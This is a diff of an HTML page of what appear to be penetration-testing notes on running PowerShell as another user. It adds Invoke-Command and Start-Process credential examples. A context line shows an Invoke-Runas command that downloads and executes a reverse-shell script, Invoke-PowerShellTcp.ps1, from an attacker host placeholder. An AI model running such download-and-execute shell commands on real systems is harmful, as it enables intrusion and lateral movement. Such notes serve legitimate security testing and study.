@@ -17,4 +17,9 @@ You can spawn a new process in the background or other with "Start-Process . . .
 Recommend to use Fuzzy's Invoke-Runas:<br/>
 Invoke-Runas -User &lt;user&gt; -Password &lt;password&gt; -Binary C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args "-c IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;:80/Invoke-PowerShellTcp.ps1')" -LogonType 0x1<br/>
 <br/>
-</body></html>
+<br/>
+Built-in:<br/>
+Invoke-Command -Credential $cred -ScriptBlock { script }&#09;&#09;&#09;#where $cred is secure string<br/>
+<br/>
+<br/>
+Start-Process -FilePath "powershell" -argumentlist "arguments" &nbsp;-Credential $cred&#09;&#09;#$cred is secure string</body></html>
